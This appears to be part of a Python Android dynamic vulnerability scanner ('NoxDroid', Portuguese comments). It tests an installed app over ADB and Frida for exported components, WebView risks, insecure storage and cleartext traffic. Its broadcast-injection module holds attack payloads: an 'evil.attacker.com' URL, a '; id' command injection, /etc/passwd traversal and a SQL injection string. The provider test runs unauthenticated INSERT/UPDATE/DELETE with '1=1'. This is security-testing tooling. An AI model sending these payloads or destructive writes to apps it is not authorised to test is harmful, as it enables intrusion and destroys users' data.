            SEV_HIGH,
            f"FLAG_SECURE ausente CONFIRMADO: {act_name.split('.')[-1]}",
            f"Frida confirmou que esta activity sensível não usa FLAG_SECURE.\n"
            f"Vulnerável a: screenshots, gravação de tela, Tapjacking via overlay.\n"
            f"Componente: {act_name}",
            e["detail"]
        ))

    for e in secure_removed:
        findings.append(_f(
            SEV_HIGH,
            "FLAG_SECURE removido em runtime",
            "FLAG_SECURE foi explicitamente removido — possível bypass de proteção de tela.",
            e["detail"]
        ))

    if not secure_miss and not secure_removed and secure_set:
        findings.append(_f(
            SEV_INFO,
            "FLAG_SECURE ativo nas activities monitoradas",
            f"Frida confirmou FLAG_SECURE em {len(secure_set)} window(s).",
        ))
    elif not secure_miss and not secure_removed and not secure_set:
        # Nenhum evento — activities críticas não foram abertas durante o teste
        for act in critical_acts:
            findings.append(_f(
                SEV_INFO,
                f"Activity sensível não aberta durante teste: {act['name'].split('.')[-1]}",
                f"Abra a activity manualmente e re-execute para confirmar FLAG_SECURE.\n"
                f"Componente: {act['name']}",
            ))

    return findings


# ─── Módulo 16: WebView RCE (addJavascriptInterface) ─────────────────────────

def test_webview_rce(adb: str, pkg: str) -> list[dict]:
    """
    Usa Frida (webview_inspector.js) para confirmar addJavascriptInterface,
    setAllowFileAccess e loadUrl com schemes perigosos em runtime.
    Sem Frida: verifica apenas via dumpsys se WebView está presente.
    """
    findings = []
    print(f"  {_DIM}→ Verificando WebView via Frida...{_RESET}")

    frida_results = _run_frida_inspector(pkg, "webview_inspector.js", duration=15)

    if frida_results is None:
        # Fallback sem Frida — só verifica presença de WebView
        out = _shell(adb, "dumpsys activity top | grep -i webview | head -5", timeout=10)
        if "webview" in out.lower():
            findings.append(_f(
                SEV_INFO,
                "WebView presente (não confirmado via Frida)",
                "WebView detectado no dumpsys. Instale Frida para análise completa.\n"
                "Verifique manualmente: addJavascriptInterface, setAllowFileAccess.",
                out[:200]
            ))
        return findings

    # Mapeia severidade dos eventos Frida
    SEV_MAP = {
        "setAllowUniversalAccessFromFileURLs": SEV_CRITICAL,
        "addJavascriptInterface":              SEV_HIGH,
        "setAllowFileAccessFromFileURLs":      SEV_HIGH,
        "loadUrl_javascript":                  SEV_HIGH,
        "loadUrl_file":                        SEV_MEDIUM,
        "setAllowFileAccess":                  SEV_MEDIUM,
        "setJavaScriptEnabled":                SEV_INFO,
        "shouldOverrideUrlLoading":            SEV_INFO,
        "FLAG_SECURE_set":                     SEV_INFO,
    }

    seen_types: set[str] = set()
    for e in frida_results:
        t = e.get("type", "")
        if t == "ready" or t in seen_types:
            continue
        sev = SEV_MAP.get(t)
        if sev and sev != SEV_INFO:
            seen_types.add(t)
            findings.append(_f(
                sev,
                f"WebView: {t.replace('_', ' ')}",
                e["detail"],
            ))
        elif sev == SEV_INFO:
            seen_types.add(t)

    if not findings and frida_results:
        findings.append(_f(
            SEV_INFO,
            "WebView sem configurações perigosas detectadas",
            "Frida monitorou o app e não encontrou addJavascriptInterface nem file access inseguro.",
        ))

    return findings


# ─── Módulo 17: Insecure Data Storage ────────────────────────────────────────

def test_insecure_storage(adb: str, pkg: str) -> list[dict]:
    findings = []
    
    print(f"  {_DIM}→ Verificando armazenamento inseguro...{_RESET}")
    
    data_dir = f"/data/data/{pkg}"
    
    # Verifica cache com dados sensíveis
    cache_files = _shell_su(adb, f"find {data_dir}/cache -type f 2>/dev/null | head -20")
    if cache_files.strip():
        # Lê alguns arquivos em busca de dados sensíveis
        sensitive_cache = []
        for cf in cache_files.splitlines()[:5]:
            cf = cf.strip()
            if not cf:
                continue
            content = _shell_su(adb, f"cat '{cf}' 2>/dev/null | head -20")
            if any(k in content.lower() for k in ["password", "token", "secret", "key", "auth", "session"]):
                sensitive_cache.append(cf)
        
        if sensitive_cache:
            findings.append(_f(
                SEV_HIGH,
                f"Dados sensíveis em cache ({len(sensitive_cache)} arquivo(s))",
                "Arquivos de cache contêm possíveis credenciais/tokens.\n"
                "Cache não é criptografado e pode ser acessado via backup.",
                "\n".join(sensitive_cache)
            ))
    
    # Verifica external storage
    ext_dir = f"/sdcard/Android/data/{pkg}"
    ext_files = _shell(adb, f"find {ext_dir} -type f 2>/dev/null | head -10")
    if ext_files.strip():
        findings.append(_f(
            SEV_MEDIUM,
            f"Dados em armazenamento externo",
            f"O app armazena dados em {ext_dir}.\n"
            "Armazenamento externo é acessível a outros apps (API < 29).",
            "\n".join(ext_files.splitlines()[:8])
        ))
    
    # Verifica temp files
    tmp_files = _shell_su(adb, f"find {data_dir} -name '*.tmp' -o -name 'temp*' 2>/dev/null | head -10")
    if tmp_files.strip():
        findings.append(_f(
            SEV_LOW,
            f"Arquivos temporários encontrados",
            "Arquivos temporários podem conter dados sensíveis não limpos.",
            "\n".join(tmp_files.splitlines()[:8])
        ))
    
    return findings


# ─── Módulo 18: Insecure Communication ───────────────────────────────────────

def test_insecure_communication(adb: str, pkg: str) -> list[dict]:
    """
    Captura logcat por 8s buscando URLs HTTP cleartext.
    Reporta como MEDIUM apenas se URL não for de recurso estático (imagem, analytics).
    """
    findings = []
    print(f"  {_DIM}→ Capturando tráfego de rede (8s)...{_RESET}")

    _adb(adb, "logcat", "-c", timeout=3)
    _shell(adb, f"monkey -p {pkg} -c android.intent.category.LAUNCHER 1 2>/dev/null")
    time.sleep(4)
    out, _, _ = _adb(adb, "logcat", "-d", "-v", "brief", timeout=8)

    # Filtra URLs HTTP — exclui recursos estáticos e analytics conhecidos
    STATIC_PATTERNS = re.compile(
        r'(?:\.png|\.jpg|\.gif|\.ico|\.css|\.woff|\.svg|\.mp4|\.mp3'
        r'|google-analytics|doubleclick|crashlytics|firebase|amplitude'
        r'|segment\.io|mixpanel|appsflyer|adjust\.com|branch\.io'
        r'|localhost|127\.0\.0\.1)', re.IGNORECASE
    )

    http_urls = re.findall(r'http://[^\s\'"<>]{8,}', out, re.IGNORECASE)
    http_urls = list(set(http_urls))

    # Separa URLs potencialmente sensíveis de recursos estáticos
    sensitive_urls = [u for u in http_urls if not STATIC_PATTERNS.search(u)]
    static_urls    = [u for u in http_urls if STATIC_PATTERNS.search(u)]

    if sensitive_urls:
        findings.append(_f(
            SEV_HIGH,
            f"HTTP cleartext em endpoints potencialmente sensíveis ({len(sensitive_urls)})",
            "URLs HTTP detectadas em logcat — dados podem ser interceptados via MITM.\n"
            "Verifique se estas URLs transmitem dados sensíveis.",
            "\n".join(sensitive_urls[:8])
        ))
    if static_urls:
        findings.append(_f(
            SEV_LOW,
            f"HTTP cleartext em recursos estáticos/analytics ({len(static_urls)})",
            "URLs HTTP de recursos não sensíveis (imagens, analytics). Baixo risco.",
            "\n".join(static_urls[:5])
        ))

    return findings


# ─── Módulo 19: Broadcast Injection com dados ────────────────────────────────

def test_broadcast_injection(adb: str, pkg: str, manifest: dict) -> list[dict]:
    """
    Envia broadcasts com extras maliciosos e verifica se foram processados.
    'Broadcast completed' confirma entrega mas não processamento — reporta como MEDIUM.
    Para confirmação real, use Intent Inspector via Frida Tools.
    """
    findings = []
    exported = [r for r in manifest["receivers"] if r["exported"] and not r["permission"]]
    if not exported:
        return findings

    print(f"  {_DIM}→ Testando broadcast injection em {len(exported)} receiver(s)...{_RESET}")

    EXTRAS = [
        ("--es", "url",      "http://evil.attacker.com/payload"),
        ("--es", "cmd",      "; id"),
        ("--es", "file",     "../../../../etc/passwd"),
        ("--es", "token",    "' OR '1'='1"),
        ("--ez", "admin",    "true"),
        ("--ei", "user_id",  "-1"),
    ]

    for recv in exported:
        name = recv["name"]
        full = name if name.startswith(pkg) else f"{pkg}{name}"
        for flag, key, val in EXTRAS:
            cmd = f"am broadcast -n {full} {flag} {key} \"{val}\" 2>&1"
            out = _shell(adb, cmd, timeout=8)
            if "Broadcast completed" in out or "result=0" in out:
                findings.append(_f(
                    SEV_MEDIUM,
                    f"Broadcast Receiver aceita extras externos: {name.split('.')[-1]}",
                    f"Receiver recebeu broadcast com extras arbitrários.\n"
                    f"Não confirmado se o valor é processado de forma insegura.\n"
                    f"Use 'Frida Tools → Intent Inspector' para confirmar sink.\n"
                    f"Payload: {flag} {key} \"{val}\"",
                    f"am broadcast -n {full} {flag} {key} \"{val}\"\n→ {out[:200]}"
                ))
                break

    return findings


# ─── Módulo 20: Fragment Injection (PreferenceActivity) ───────────────────────

def test_fragment_injection(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []

    # Verifica se alguma activity exportada pode ser PreferenceActivity
    exported = [a for a in manifest["activities"] if a["exported"] and not a["permission"]]
    if not exported:
        return findings

    print(f"  {_DIM}→ Testando Fragment Injection em activities exportadas...{_RESET}")

    # Payloads de fragment injection
    FRAGMENTS = [
        "android.preference.PreferenceFragment",
        "com.android.settings.ChooseLockPassword",
        "com.android.settings.ChooseLockPattern",
        "android.app.Fragment",
    ]

    for act in exported:
        name = act["name"]
        full = name if name.startswith(pkg) else f"{pkg}{name}"
        for frag in FRAGMENTS:
            cmd = f"am start -n {full} --es :android:show_fragment {frag} 2>&1"
            out = _shell(adb, cmd, timeout=8)
            if "Starting:" in out and "Error" not in out and "Exception" not in out:
                findings.append(_f(
                    SEV_HIGH,
                    f"Fragment Injection potencial: {name.split('.')[-1]}",
                    f"Activity aceita extra ':android:show_fragment' sem validação.\n"
                    f"Permite carregar fragments arbitrários (Android < 4.4).\n"
                    f"Fragment testado: {frag}",
                    f"am start -n {full} --es :android:show_fragment {frag}\n→ {out[:200]}"
                ))
                break

    return findings


# ─── Módulo 21: Provider Write Operations (INSERT/UPDATE/DELETE) ──────────────

def test_provider_write(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    exported = [
        p for p in manifest["providers"]
        if p["exported"] and not p["permission"]
        and not p["read_perm"] and not p["write_perm"]
        and p["authorities"]
    ]
    if not exported:
        return findings

    print(f"  {_DIM}→ Testando operações de escrita em {len(exported)} provider(s)...{_RESET}")

    for prov in exported:
        auth = prov["authorities"].split(";")[0]
        uri  = f"content://{auth}"

        # INSERT
        out_ins = _shell(adb, f"content insert --uri {uri} --bind name:s:injected --bind value:s:test 2>&1", timeout=10)
        if "Exception" not in out_ins and "Permission Denial" not in out_ins and "Error" not in out_ins:
            findings.append(_f(
                SEV_CRITICAL,
                f"Content Provider: INSERT sem permissão em {auth}",
                "Qualquer app pode inserir dados no provider sem permissão.",
                f"content insert --uri {uri} --bind name:s:injected\n→ {out_ins[:300]}"
            ))

        # UPDATE
        out_upd = _shell(adb, f"content update --uri {uri} --bind value:s:hacked --where \"1=1\" 2>&1", timeout=10)
        if "Exception" not in out_upd and "Permission Denial" not in out_upd and "Error" not in out_upd:
            findings.append(_f(
                SEV_CRITICAL,
                f"Content Provider: UPDATE sem permissão em {auth}",
                "Qualquer app pode modificar dados do provider sem permissão.",
                f"content update --uri {uri} --bind value:s:hacked\n→ {out_upd[:300]}"
            ))

        # DELETE
        out_del = _shell(adb, f"content delete --uri {uri} --where \"1=1\" 2>&1", timeout=10)
        if "Exception" not in out_del and "Permission Denial" not in out_del and "Error" not in out_del:
            findings.append(_f(
                SEV_CRITICAL,
                f"Content Provider: DELETE sem permissão em {auth}",
                "Qualquer app pode deletar dados do provider sem permissão.",
                f"content delete --uri {uri} --where 1=1\n→ {out_del[:300]}"
            ))

    return findings


# ─── Módulo 22: Screenshot Protection (FLAG_SECURE) ──────────────────────────

def test_screenshot_protection(adb: str, pkg: str, manifest: dict) -> list[dict]:
    """
    Usa Frida (ui_security_inspector.js) para confirmar FLAG_SECURE.
    Este módulo é complementar ao test_tapjacking — foca em activities não-sensíveis
    que também deveriam ter FLAG_SECURE (ex: telas de dados bancários sem 'login' no nome).
    """
    findings = []

    critical_kw = ["login", "password", "payment", "transfer", "confirm", "auth",
                   "pin", "otp", "wallet", "checkout", "credit", "card", "account",
                   "profile", "settings", "secure", "private"]
    critical_acts = [
        a for a in manifest["activities"]
        if any(kw in a["name"].lower() for kw in critical_kw)
    ]
    if not critical_acts:
        return findings

    print(f"  {_DIM}→ Verificando Screenshot Protection via Frida...{_RESET}")

    frida_results = _run_frida_inspector(pkg, "ui_security_inspector.js", duration=10)

    if frida_results is None:
        # Sem Frida — não reporta nada (evita FP)
        return findings

    secure_confirmed = any(
        e.get("type") in ("flag_secure_set", "flag_secure_added")
        for e in frida_results
    )
    missing_confirmed = [
        e for e in frida_results if e.get("type") == "missing_flag_secure"
    ]

    for e in missing_confirmed:
        act_name = e["detail"].split(":")[1].strip().split("\n")[0] if ":" in e["detail"] else "unknown"
        findings.append(_f(
            SEV_HIGH,
            f"Screenshot Protection ausente CONFIRMADO: {act_name.split('.')[-1]}",
            "Frida confirmou que activity sensível não usa FLAG_SECURE.\n"
            "Permite captura de tela, gravação e acesso via Accessibility Services.",
            e["detail"]
        ))

    return findings


# ─── Módulo 23: StrandHogg 2.0 (taskAffinity + allowTaskReparenting) ─────────

def test_strandhogg2(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []

    for act in manifest["activities"]:
        name = act["name"]
        task_affinity = _attr_from_entry(act, "taskAffinity")
        allow_reparent = _attr_from_entry(act, "allowTaskReparenting")

        # StrandHogg 2.0: activity com taskAffinity diferente do package + allowTaskReparenting=true
        if (allow_reparent.lower() == "true" and
                task_affinity and task_affinity != pkg):
            findings.append(_f(
                SEV_HIGH,
                f"StrandHogg 2.0: {name.split('.')[-1]}",
                f"Activity com taskAffinity='{task_affinity}' e allowTaskReparenting=true.\n"
                f"Um app malicioso pode reparentar esta activity para sua própria task,\n"
                f"permitindo phishing de UI (overlay de tela de login).",
                f"Componente: {name}\ntaskAffinity: {task_affinity}\nallowTaskReparenting: true"
            ))

    return findings


def _attr_from_entry(entry: dict, key: str) -> str:
    """Extrai atributo extra do dict de componente (para campos não mapeados no parse)."""
    return entry.get(key, "")


# ─── Módulo 24: Implicit Broadcast Receivers ─────────────────────────────────

def test_implicit_broadcasts(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []

    # Broadcasts do sistema que não deveriam ser recebidos sem permissão
    DANGEROUS_SYSTEM_BROADCASTS = [
        "android.intent.action.BOOT_COMPLETED",
        "android.intent.action.PACKAGE_ADDED",
        "android.intent.action.PACKAGE_REMOVED",
        "android.intent.action.PACKAGE_REPLACED",
        "android.intent.action.ACTION_POWER_CONNECTED",
        "android.intent.action.ACTION_POWER_DISCONNECTED",
        "android.net.conn.CONNECTIVITY_CHANGE",
        "android.intent.action.USER_PRESENT",
        "android.intent.action.SCREEN_ON",
        "android.intent.action.SCREEN_OFF",
        "android.intent.action.SEND",
        "android.intent.action.SENDTO",
    ]

    # Lê o manifest para encontrar receivers com intent-filters de sistema
    manifest_path = None
    for candidate in [
        RESULTS_DIR / pkg / "decompiled" / "smali" / "AndroidManifest.xml",
    ]:
        if candidate.exists():
            manifest_path = candidate
            break

    if not manifest_path:
        return findings

    try:
        tree = ET.parse(str(manifest_path))
        root = tree.getroot()
        app  = root.find("application")
        if app is None:
            return findings

        for recv in app.findall("receiver"):
            name       = _attr(recv, "name")
            exported   = _attr(recv, "exported")
            permission = _attr(recv, "permission")
            has_filter = recv.find("intent-filter") is not None

            if not has_filter:
                continue

            # Coleta todas as actions deste receiver
            actions = []
            for ifilter in recv.findall("intent-filter"):
                for action in ifilter.findall("action"):
                    actions.append(_attr(action, "name"))

            dangerous = [a for a in actions if a in DANGEROUS_SYSTEM_BROADCASTS]
            if dangerous and not permission:
                findings.append(_f(
                    SEV_MEDIUM,
                    f"Receiver escuta broadcasts do sistema sem permissão: {name.split('.')[-1]}",
                    f"Receiver registrado para {len(dangerous)} broadcast(s) do sistema sem proteção.\n"
                    f"Pode ser acionado por qualquer app ou evento do sistema.",
                    f"Componente: {name}\nBroadcasts: {', '.join(dangerous[:5])}"
                ))
    except Exception:
        pass

    return findings


# ─── Módulo 25: Exported Activities com Intent-Filter implícito ───────────────

def test_implicit_intent_activities(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []

    # Activities exportadas via intent-filter mas sem permissão explícita
    # (diferente do test_exported_activities que testa se consegue abrir)
    implicit = [
        a for a in manifest["activities"]
        if a["exported"] and not a["permission"]
    ]

    if not implicit:
        return findings

    print(f"  {_DIM}→ Verificando activities com intent-filter implícito...{_RESET}")

    # Tenta abrir via intent implícito (sem especificar componente)
    manifest_path = None
    for candidate in [RESULTS_DIR / pkg / "decompiled" / "smali" / "AndroidManifest.xml"]:
        if candidate.exists():
            manifest_path = candidate
            break

    if not manifest_path:
        return findings

    try:
        tree = ET.parse(str(manifest_path))
        root = tree.getroot()
        app  = root.find("application")
        if app is None:
            return findings

        for act in app.findall("activity"):
            name       = _attr(act, "name")
            permission = _attr(act, "permission")
            if permission:
                continue

            for ifilter in act.findall("intent-filter"):
                actions    = [_attr(a, "name") for a in ifilter.findall("action")]
                categories = [_attr(c, "name") for c in ifilter.findall("category")]

                # Ignora MAIN/LAUNCHER (esperado)
                if "android.intent.action.MAIN" in actions:
                    continue

                # Verifica se tem BROWSABLE (deeplink — já coberto)
                if "android.intent.category.BROWSABLE" in categories:
                    continue

                # Actions não-padrão expostas implicitamente
                custom_actions = [a for a in actions if not a.startswith("android.intent.action.")]
                if custom_actions:
                    findings.append(_f(
                        SEV_MEDIUM,
                        f"Activity com action customizada exposta: {name.split('.')[-1]}",
                        f"Activity responde a intent implícito com action customizada.\n"
                        f"Qualquer app pode disparar esta activity via intent implícito.",
                        f"Componente: {name}\nActions: {', '.join(custom_actions[:3])}"
                    ))
                    break
    except Exception:
        pass

    return findings


# ─── Report ───────────────────────────────────────────────────────────────────

def _print_section(title: str):
    print(f"\n{_CYAN}{'─' * 70}{_RESET}")
    print(f"{_CYAN}{_BOLD}  {title}{_RESET}")
    print(f"{_CYAN}{'─' * 70}{_RESET}\n")


def _print_summary(findings: list[dict]):
    from collections import Counter
    counts = Counter(f["sev"] for f in findings)
    order  = [SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM, SEV_LOW, SEV_INFO]
    parts  = []
    for sev in order:
        n = counts.get(sev, 0)
        if n:
            color = _SEV_COLOR[sev]
            parts.append(f"{color}{sev}: {n}{_RESET}")
    print(f"\n  {_BOLD}Resumo:{_RESET}  " + "  |  ".join(parts) if parts else f"  {_GREEN}Nenhuma vulnerabilidade encontrada.{_RESET}")


def _save_report(findings: list[dict], out_file: Path, pkg: str, adb_info: str):
    order = [SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM, SEV_LOW, SEV_INFO]
    from collections import defaultdict
    by_sev: dict = defaultdict(list)
    for f in findings:
        by_sev[f["sev"]].append(f)

    with open(out_file, "w", encoding="utf-8") as fp:
        fp.write(f"Dynamic Vulnerability Scanner — NoxDroid\n")
        fp.write(f"Package : {pkg}\n")
        fp.write(f"Device  : {adb_info}\n")
        fp.write(f"Data    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        fp.write("=" * 70 + "\n")
        for sev in order:
            items = by_sev.get(sev, [])
            if not items:
                continue
            fp.write(f"\n{'─'*40}\n{sev} ({len(items)})\n{'─'*40}\n")
            for item in items:
                fp.write(f"\n▸ {item['title']}\n")
                fp.write(f"  {item['detail']}\n")
                if item["evidence"]:
                    for line in item["evidence"].splitlines():
                        fp.write(f"  > {line}\n")

    print(f"\n  {_GREEN}✔ Relatório salvo em: {out_file}{_RESET}")


# ─── Ponto de entrada ─────────────────────────────────────────────────────────

def run_vuln_scanner(pkg: str, adb: str, smali_folder: Path | None = None):
    """
    Scanner dinâmico de vulnerabilidades.
    - pkg: package name do app (ex: com.example.app)
    - adb: caminho do executável adb
    - smali_folder: pasta com smali descompilado (para ler o Manifest)
                    Se None, tenta localizar em results/<pkg>/decompiled/smali
    """
    _print_section("Dynamic Vulnerability Scanner")
    print(f"  {_WHITE}Package: {pkg}{_RESET}")

    # Verifica dispositivo
    if not _device_connected(adb):
        print(f"  {_RED}✖ Nenhum dispositivo ADB conectado.{_RESET}")
        input(f"\n{_DIM}→ Enter para continuar...{_RESET}")
        return

    # Verifica se o app está instalado
    if not _pkg_installed(adb, pkg):
        print(f"  {_RED}✖ Package '{pkg}' não encontrado no dispositivo.{_RESET}")
        print(f"  {_DIM}  Instale o APK antes de executar o scanner dinâmico.{_RESET}")
        input(f"\n{_DIM}→ Enter para continuar...{_RESET}")
        return

    # Info do dispositivo
    device_info = _shell(adb, "getprop ro.product.model").strip()
    android_ver = _shell(adb, "getprop ro.build.version.release").strip()
    print(f"  {_DIM}Dispositivo: {device_info}  Android {android_ver}{_RESET}\n")

    # Localiza smali folder — se não existir, baixa e descompila automaticamente
    if smali_folder is None:
        candidate = RESULTS_DIR / pkg / "decompiled" / "smali"
        if candidate.exists():
            smali_folder = candidate

    if smali_folder is None:
        print(f"  {_YELLOW}⚠ Smali não encontrado — baixando e descompilando APK automaticamente...{_RESET}")
        try:
            from modules.apk_analyzer import pull_apk_from_device, decompile_apktool
            apk_path = pull_apk_from_device(adb, pkg)
            if apk_path:
                print(f"  {_DIM}→ Descompilando com apktool...{_RESET}")
                result_folder = decompile_apktool(apk_path)
                if result_folder and result_folder.exists():
                    smali_folder = result_folder
                    print(f"  {_GREEN}✔ Smali pronto: {smali_folder}{_RESET}\n")
                else:
                    print(f"  {_YELLOW}⚠ Decompilação falhou — continuando sem Manifest.{_RESET}\n")
            else:
                print(f"  {_YELLOW}⚠ Não foi possível baixar o APK — continuando sem Manifest.{_RESET}\n")
        except Exception as e:
            print(f"  {_YELLOW}⚠ Erro ao preparar smali: {e} — continuando sem Manifest.{_RESET}\n")

    # Parse do manifest
    manifest = _parse_manifest(smali_folder) if smali_folder else {
        "package": pkg, "debuggable": False, "allowBackup": True,
        "networkSecurityConfig": False,
        "activities": [], "services": [], "receivers": [], "providers": [],
        "deeplinks": [],
    }
    if not manifest["package"]:
        manifest["package"] = pkg

    # Sessão de resultados
    from core.report_paths import dynamic_dir
    session_dir = dynamic_dir(pkg)

    all_findings: list[dict] = []

    # ── Executa todos os módulos ──────────────────────────────────────────────
    MODULES = [
        ("Debuggable",                  lambda: test_debuggable(adb, pkg, manifest)),
        ("Backup ADB",                  lambda: test_adb_backup(adb, pkg, manifest)),
        ("Activities exportadas",       lambda: test_exported_activities(adb, pkg, manifest)),
        ("Services exportados",         lambda: test_exported_services(adb, pkg, manifest)),
        ("Receivers exportados",        lambda: test_exported_receivers(adb, pkg, manifest)),
        ("Broadcast Injection",         lambda: test_broadcast_injection(adb, pkg, manifest)),
        ("Content Providers",           lambda: test_content_providers(adb, pkg, manifest)),
        ("Provider Write Ops",          lambda: test_provider_write(adb, pkg, manifest)),
        ("SQLi em Providers",           lambda: test_sqli_providers(adb, pkg, manifest)),
        ("Task Hijacking",              lambda: test_task_hijacking(adb, pkg, manifest)),
        ("StrandHogg 2.0",              lambda: test_strandhogg2(adb, pkg, manifest)),
        ("Tapjacking",                  lambda: test_tapjacking(adb, pkg, manifest)),
        ("Screenshot Protection",       lambda: test_screenshot_protection(adb, pkg, manifest)),
        ("Deeplinks",                   lambda: test_deeplinks(adb, pkg, manifest)),
        ("Intent Injection",            lambda: test_intent_injection(adb, pkg, manifest)),
        ("Fragment Injection",          lambda: test_fragment_injection(adb, pkg, manifest)),
        ("Implicit Intent Activities",  lambda: test_implicit_intent_activities(adb, pkg, manifest)),
        ("Implicit Broadcasts",         lambda: test_implicit_broadcasts(adb, pkg, manifest)),
        ("WebView RCE",                 lambda: test_webview_rce(adb, pkg)),
        ("File Permissions",            lambda: test_file_permissions(adb, pkg)),
        ("Insecure Storage",            lambda: test_insecure_storage(adb, pkg)),
        ("Logcat Leak",                 lambda: test_logcat_leak(adb, pkg)),
        ("Insecure Communication",      lambda: test_insecure_communication(adb, pkg)),
        ("Network Security",            lambda: test_network_security(adb, pkg, manifest)),
        ("Clipboard",                   lambda: test_clipboard(adb, pkg)),
    ]

    for label, fn in MODULES:
        print(f"  {_CYAN}[{label}]{_RESET}", end=" ", flush=True)
        try:
            results = fn()
            n = len(results)
            if n:
                color = _RED if any(f["sev"] in (SEV_CRITICAL, SEV_HIGH) for f in results) else _YELLOW
                print(f"{color}{n} finding(s){_RESET}")
                for f in results:
                    _print_finding(f)
            else:
                print(f"{_GREEN}ok{_RESET}")
            all_findings.extend(results)
        except Exception as e:
            print(f"{_DIM}erro: {e}{_RESET}")

    # ── Resumo e relatório ────────────────────────────────────────────────────
    _print_summary(all_findings)

    out_file = session_dir / "dynamic_vulns.txt"
    _save_report(all_findings, out_file, pkg, f"{device_info} Android {android_ver}")

    input(f"\n{_DIM}→ Enter para continuar...{_RESET}")
